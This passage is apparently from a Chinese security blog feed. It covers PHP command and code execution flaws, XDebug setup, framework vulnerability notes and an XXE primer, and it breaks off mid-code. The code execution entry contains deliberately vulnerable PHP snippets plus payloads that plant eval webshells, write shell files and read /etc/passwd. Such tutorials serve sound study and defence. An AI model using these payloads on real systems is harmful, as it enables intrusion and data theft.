&#x2F; escapeshellarg过滤</p><p>​2.1、escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数</p><p>​2.2、escapeshellcmd shell 元字符转义</p><p>3、参数的值尽量使用引号包裹，并在拼接前调用addslashes进行转义。</p><p>4、exec() 函数中数据，避免用户可控。</p>]]></content>
      
      
      <categories>
          
          <category> 外网漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XDEBUG配置</title>
      <link href="/2022/10/11/XDEBUG/"/>
      <url>/2022/10/11/XDEBUG/</url>
      
        <content type="html"><![CDATA[<h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><p>phpStudy2016</p><p>PHPStorm</p><h2 id="PHP配置"><a href="#PHP配置" class="headerlink" title="PHP配置"></a>PHP配置</h2><h3 id="phpStudy2016"><a href="#phpStudy2016" class="headerlink" title="phpStudy2016"></a>phpStudy2016</h3><p>先检查phpStudy的PHP版本</p><p><img src="/../note_image/image-20221011130532653.png" alt="image-20221011130532653"></p><p>然后打开php.ini配置文件，把最底下的XDebug进行修改为</p><p><img src="/../note_image/image-20221011130611850.png" alt="image-20221011130611850"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">xdebug.profiler_output_dir=&quot;E:\Myfile\phpstudy\tmp\xdebug&quot; ;optional</span><br><span class="line">xdebug.trace_output_dir=&quot;E:\Myfile\phpstudy\tmp\xdebug&quot; ;optional</span><br><span class="line">zend_extension=&quot;E:\Myfile\phpstudy\php\php-7.0.12-nts\ext\php_xdebug.dll&quot;    ;xdebug扩展的位置，每个人可能不一样，必须确定的</span><br><span class="line">xdebug.remote_enable=On ;启动远程调试，必须确定</span><br><span class="line">xdebug.remote_host=127.0.0.1 ;需要调试的远程主机</span><br><span class="line">xdebug.remote_port=9001  ;远程主机与phpstorm通信的端口，必须确定</span><br><span class="line">xdebug.remote_handler=dbgp ;通信协议，optional</span><br><span class="line">xdebug.auto_trace=on ;启用代码自动跟踪，optional</span><br><span class="line">xdebug.idekey=PHPSTORM;optional</span><br><span class="line">xdebug.collect_return=On ;收集返回值，optional</span><br><span class="line">xdebug.collect_params=On</span><br></pre></td></tr></table></figure><h3 id="小皮面板"><a href="#小皮面板" class="headerlink" title="小皮面板"></a>小皮面板</h3><p>需要先打开XDEBUG，否则php.ini配置文件里没有XDEBUG的配置</p><p><img src="/../note_image/image-20221012093803986.png" alt="image-20221012093803986"></p><p>然后把phpStudy上的配置同样的粘贴替换进去</p><p><img src="/../note_image/image-20221012094139042.png" alt="image-20221012094139042"></p><p>注意：后面的phpStorm配置步骤也要切换到相应的版本！</p><h2 id="PHPStorm配置"><a href="#PHPStorm配置" class="headerlink" title="PHPStorm配置"></a>PHPStorm配置</h2><p>打开phpstorm的设置，把PHP的解释器和调试器配置成对应版本</p><p><img src="/../note_image/image-20221011130938178.png" alt="image-20221011130938178"></p><p>再配置PHP服务器</p><p><img src="/../note_image/image-20221011131222542.png" alt="image-20221011131222542"></p><p>再配置PHP调试端口</p><p><img src="/../note_image/image-20221011131309293.png" alt="image-20221011131309293"></p><p>在配置PHP调试代理</p><p><img src="/../note_image/image-20221011131349490.png" alt="image-20221011131349490"></p><p>然后配置PHP网页</p><p><img src="/../note_image/image-20221011131439702.png" alt="image-20221011131439702"></p><p><img src="/../note_image/image-20221011131545719.png" alt="image-20221011131545719"></p><p><img src="/../note_image/image-20221011131929473.png" alt="image-20221011131929473"></p><h2 id="代码DEBUG"><a href="#代码DEBUG" class="headerlink" title="代码DEBUG"></a>代码DEBUG</h2><p>先打开PHPstorm的监听</p><p><img src="/../note_image/image-20221011131945859.png" alt="image-20221011131945859"></p><p>然后浏览器输入准备调试的文件和监听语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XDEBUG_SESSION_START=PHPSTORM</span><br></pre></td></tr></table></figure><p><img src="/../note_image/image-20221011132100530.png" alt="image-20221011132100530"></p><p>回车，初次连接会添加服务器</p><p><img src="/../note_image/image-20221011132152311.png" alt="image-20221011132152311"></p><p>进入调试页面，成功！</p><p><img src="/../note_image/image-20221011132255324.png" alt="image-20221011132255324"></p>]]></content>
      
      
      <categories>
          
          <category> 前提知识 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>任意代码执行</title>
      <link href="/2022/10/11/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
      <url>/2022/10/11/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>​在web应用种有时候程序员为了考虑灵活性和简洁性，会在代码中调用PHP函数去处理。但是在应用调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，这就会造成了代码执行漏洞。</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>​程序员在代码中使用了一些执行函数例如eval,assert等函数,用户可以控制这个字符串去这些函数中执行,从而造成安全漏洞</p><h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">eval()</span><br><span class="line"></span><br><span class="line">assert()</span><br><span class="line"></span><br><span class="line">preg_replace() /e模式</span><br><span class="line"></span><br><span class="line">create_function()</span><br><span class="line"></span><br><span class="line">array_map()</span><br><span class="line"></span><br><span class="line">call_user_func()</span><br><span class="line"></span><br><span class="line">call_user_array()</span><br><span class="line"></span><br><span class="line">array_filter()</span><br><span class="line"></span><br><span class="line">usort()</span><br><span class="line"></span><br><span class="line">uasort()</span><br><span class="line"></span><br><span class="line">$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;])//assert(phpinfo())</span><br></pre></td></tr></table></figure><h2 id="eval函数漏洞利用"><a href="#eval函数漏洞利用" class="headerlink" title="eval函数漏洞利用"></a>eval函数漏洞利用</h2><p>eval()这个函数虽然能直接执行命令，但是在现在的网络环境中，基本上被后门检测的工具和平台给杀疯了，所以，使用这个函数会相对麻烦一点···</p><h3 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;\$re=<span class="subst">$data</span>;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$re</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?data=phpinfo()</span></span><br><span class="line"><span class="comment">// ?data=1;phpinfo()</span></span><br><span class="line"><span class="comment">// ?data=$&#123;phpinfo()&#125;;</span></span><br></pre></td></tr></table></figure><h3 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$data</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="variable">$eval</span>(<span class="string">&quot;\$re = strtolower(&#x27;<span class="subst">$data</span>&#x27;);&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$re</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?data=&#x27;);phpinfo();(&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="方式三"><a href="#方式三" class="headerlink" title="方式三"></a>方式三</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$data</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;\$ret=strolower(\&quot;<span class="subst">$data</span>\&quot;);&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?data=$&#123;phpinfo()&#125;(需要php版本在5.5及以上)</span></span><br><span class="line"><span class="comment">// ?data=&quot;);phpinfo();&quot;(</span></span><br></pre></td></tr></table></figure><h2 id="assert函数"><a href="#assert函数" class="headerlink" title="assert函数"></a>assert函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">@<span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])</span><br><span class="line">    </span><br><span class="line"><span class="comment">//需要php的版本低于7.1，才可以动态调用 </span></span><br></pre></td></tr></table></figure><h2 id="preg-replace函数"><a href="#preg-replace函数" class="headerlink" title="preg_replace函数"></a>preg_replace函数</h2><p>这个函数本意是执行一个正则表达式的搜索和替换的，但是使用了&#x2F;e模式的时候，就可以吧后面的参数进行执行操作了···</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/test/e&quot;</span>,<span class="variable">$a</span>,<span class="string">&quot;just a test&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关键点：第二个参数--replacement参数我们是否能控制，然后第一个参数pattern是否为/e模式</span></span><br><span class="line"><span class="comment">//需要注意的是，第三个参数必须满足第一个参数pattern的条件</span></span><br></pre></td></tr></table></figure><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&lt;data&gt;(.*)&lt;\/data&gt;/e&#x27;</span>, <span class="string">&#x27;$ret=&quot;\\1&quot;;&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//php版本在5.5以上</span></span><br><span class="line"><span class="comment">// ?data=&lt;data&gt;&#123;$&#123;phpinfo()&#125;&#125;&lt;/data&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//&#123;$&#123;@eval($_POST[1])&#125;&#125; 一句话</span></span><br><span class="line"><span class="comment">//&#123;$&#123;exit(print(getcwd()))&#125;&#125;获取当前工作路径</span></span><br><span class="line"><span class="comment">//&#123;$&#123;exit(var_dump(file_get_contents($_POST[f])))&#125;&#125; </span></span><br><span class="line"><span class="comment">//读文件   </span></span><br><span class="line"><span class="comment">//f=/etc/passwd</span></span><br><span class="line"><span class="comment">//&#123;$&#123;file_put_contents($_POST[1], $_POST[0])&#125;&#125;</span></span><br><span class="line"><span class="comment">//写webshell  1=1.php&amp;0=1111111</span></span><br></pre></td></tr></table></figure><h2 id="create-function函数"><a href="#create-function函数" class="headerlink" title="create_function函数"></a>create_function函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sort_by</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sort_by&#x27;</span>];</span><br><span class="line"><span class="variable">$sorter</span> = <span class="string">&#x27;strnatcasecmp&#x27;</span>;</span><br><span class="line"><span class="variable">$sort_function</span> = <span class="string">&#x27; return 1 * &#x27;</span> . <span class="variable">$sorter</span> . <span class="string">&#x27;($a[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;], $b[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;]);&#x27;</span>;</span><br><span class="line"><span class="variable">$func</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="variable">$sort_function</span>);</span><br><span class="line"><span class="variable">$func</span>(<span class="number">1</span>,<span class="variable">$sort_by</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?sort_by=“]);&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure><h2 id="usort"><a href="#usort" class="headerlink" title="usort"></a>usort</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$lambda</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="string">&quot;return (strlen(\$a)-strlen(\$b)+&quot;</span> . <span class="string">&quot;strlen(<span class="subst">$c</span>));&quot;</span>);</span><br><span class="line"><span class="variable">$array</span> = <span class="keyword">array</span>(<span class="string">&#x27;reall long string here,boy&#x27;</span>, <span class="string">&#x27;this&#x27;</span>, <span class="string">&#x27;midding lenth&#x27;</span>, <span class="string">&#x27;larget&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">usort</span>(<span class="variable">$array</span>, <span class="variable">$lambda</span>);</span><br></pre></td></tr></table></figure><h2 id="array-map函数"><a href="#array-map函数" class="headerlink" title="array_map函数"></a>array_map函数</h2><p>​array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。</p><p> 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>] = <span class="variable">$cmd</span>;</span><br><span class="line"><span class="variable">$new_array</span> = <span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>, <span class="variable">$array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$new_array</span>;</span><br></pre></td></tr></table></figure><h2 id="calll-user-func函数"><a href="#calll-user-func函数" class="headerlink" title="calll_user_func函数"></a>calll_user_func函数</h2><p>7.4仍可以用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&quot;assert&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure><h2 id="array-filter-函数"><a href="#array-filter-函数" class="headerlink" title="array_filter()函数"></a>array_filter()函数</h2><p>7.4版本以下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"> <span class="variable">$array</span>[<span class="number">0</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="title function_ invoke__">array_filter</span>(<span class="variable">$array</span>,<span class="string">&#x27;assert&#x27;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">usort</span>(...<span class="variable">$_GET</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//执行语句 : ?1[]=1-1&amp;1[]=eval($_POST[‘x’])&amp;2=assert  (用蚁剑连接)</span></span><br></pre></td></tr></table></figure><h1 id="漏洞修复方案"><a href="#漏洞修复方案" class="headerlink" title="漏洞修复方案"></a>漏洞修复方案</h1><p>1、对于eval( )等函数一定要保证用户不能轻易接触eval或者其他代码执行的的参数或者用正则严格(preg_replace &#x2F;e)判断输入的数据格式。</p><p>2、对于字符串一定要使用单引号包裹可控代码，并且 插入前进行addslashes().</p><p>3、对于preg_replace放弃使用e修饰符。如果必须要用e修饰符，请保证第二个参数中，对于正则匹配出的对象，用单引号包裹 。</p>]]></content>
      
      
      <categories>
          
          <category> 外网漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一些框架漏洞</title>
      <link href="/2022/10/11/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/10/11/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h2 id="THINKPHP3-0-5-1"><a href="#THINKPHP3-0-5-1" class="headerlink" title="THINKPHP3.0-5.1"></a>THINKPHP3.0-5.1</h2><h3 id="3-0-3-2"><a href="#3-0-3-2" class="headerlink" title="3.0-3.2"></a>3.0-3.2</h3><p>漏洞原因：parseWhereItem函数对between关键字的正则匹配错误，导致了SQL注入。</p><h3 id="5-0-5-1"><a href="#5-0-5-1" class="headerlink" title="5.0-5.1"></a>5.0-5.1</h3><p>由两种方法触发命令执行，第一种是request的method和__construct方法造成的，另一种是因为Request类在兼容模式下获取的控制器没有进行合法校验<br>5.0.12之前的版本不需要需要开启debug进行触发call_user_function命令执行</p><h2 id="sping框架："><a href="#sping框架：" class="headerlink" title="sping框架："></a>sping框架：</h2><p>SPLE引起的漏洞，远程命令执行漏洞</p><h2 id="shiro反序列化漏洞："><a href="#shiro反序列化漏洞：" class="headerlink" title="shiro反序列化漏洞："></a>shiro反序列化漏洞：</h2><h3 id="保存密码"><a href="#保存密码" class="headerlink" title="保存密码"></a>保存密码</h3><p>特征 记住账号密码rememberMe&#x3D;DeleteMe ，Payload产生的过程：命令&#x3D;&gt;序列化&#x3D;&gt;AES加密&#x3D;&gt;base64编码&#x3D;&gt;RememberMe Cookie值。<br>解决方案：修改默认密钥。</p><h2 id="weblogic反序列化漏洞："><a href="#weblogic反序列化漏洞：" class="headerlink" title="weblogic反序列化漏洞："></a>weblogic反序列化漏洞：</h2><p>cve2017-10271原理 WLS组件存在XMLDecoder类造成远程代码执行漏洞</p><h2 id="fastjson漏洞-1-2-47"><a href="#fastjson漏洞-1-2-47" class="headerlink" title="fastjson漏洞 1.2.47"></a>fastjson漏洞 1.2.47</h2><p>在json传输哪里随便输入json语句，出现com.alibaba.fastjson.JSON就是有漏洞<br>fastjson的反序列化没有用java那一套东西，他自己引用了一套属性也就是autotype，在序列化的时候把原始类型记录下来<br>在1.2.24版本之前@type传入的类没有经过任何过滤即可加载类并调用rmi协议处理恶意代码，在25版本之后就默认关闭了autotype加入了checkautotype过滤@type里面的值</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前提知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE——XML</title>
      <link href="/2022/10/10/XXE_XML/"/>
      <url>/2022/10/10/XXE_XML/</url>
      
        <content type="html"><![CDATA[<h3 id="XML介绍"><a href="#XML介绍" class="headerlink" title="XML介绍"></a>XML介绍</h3><p>XML 指可扩展标记语言（EXtensible Markup Langusage）。</p><p>XML 的设计宗旨是传输数据，而不是显示数据。</p><p>XML 是 W3C 的推荐标准。</p><p>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。</p><p>XML 语言没有预定义的标签。</p><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">所有XML元素都必须有关闭标签</span><br><span class="line"></span><br><span class="line">XML标签对大小写敏感</span><br><span class="line"></span><br><span class="line">XML必须正确的嵌套</span><br><span class="line"></span><br><span class="line">XML文档必须有根元素</span><br><span class="line"></span><br><span class="line">XML的属性值必须加引号</span><br><span class="line"></span><br><span class="line">可以将多个字符放入&lt;![CDATA[内容]]&gt;进行转义</span><br></pre></td></tr></table></figure><h3 id="标准格式"><a href="#标准格式" class="headerlink" title="标准格式"></a>标准格式</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span>//XML声明</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)]&gt;</span>//文档类型定义</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span>  (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span>  (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">heading</span>  (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span>  (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span>//文档元素</span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the blog!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>​XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。</p><p>​ DTD用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。是XML文档中的几条语句，用来说明哪些元素&#x2F;属性是合法的以及元素间应当怎样嵌套&#x2F;结合，也用来将一些特殊字符和可复用代码段自定义为实体。</p><h3 id="实体引用"><a href="#实体引用" class="headerlink" title="实体引用"></a>实体引用</h3><p>​XML元素，例如 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;tag&gt;foo&lt;/tag&gt;</span><br></pre></td></tr></table></figure><p>​如果xml元素内部出现如&lt; 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。</p><p> XML预定义五个实体引用，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot; 对应 &lt; &gt; &amp; &#x27; &quot; 。</span><br></pre></td></tr></table></figure><p>​实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行。</p><h3 id="内部声明实体"><a href="#内部声明实体" class="headerlink" title="内部声明实体"></a>内部声明实体</h3><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p><p>一个内部实体声明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p>例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DTD:</span><br><span class="line">&lt;!ENTITY writer &quot;me&quot;&gt;</span><br><span class="line"></span><br><span class="line">XML:</span><br><span class="line">&lt;author&gt;&amp;writer;&lt;/author&gt;</span><br></pre></td></tr></table></figure><p>ps: 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 (;)。</p><h3 id="XML实体"><a href="#XML实体" class="headerlink" title="XML实体"></a>XML实体</h3><p>​XML 中的实体分为以下五种：</p><p>字符实体、命名实体、外部实体、参数实体、内部实体</p><p>​普通实体和参数实体都分为内部实体和外部实体两种，外部实体定义需要加上 SYSTEM关键字，其内容是URL所指向的外部文件实际的内容。如果不加SYSTEM关键字，则为内部实体，表示实体指代内容为字符串。</p><h3 id="XML外部实体示例"><a href="#XML外部实体示例" class="headerlink" title="XML外部实体示例"></a>XML外部实体示例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">libxml_disable_entity_loader</span> (<span class="literal">false</span>);</span><br><span class="line">    <span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);<span class="comment">//获取客户端输入内容</span></span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();<span class="comment">//初始化XML解析器</span></span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span 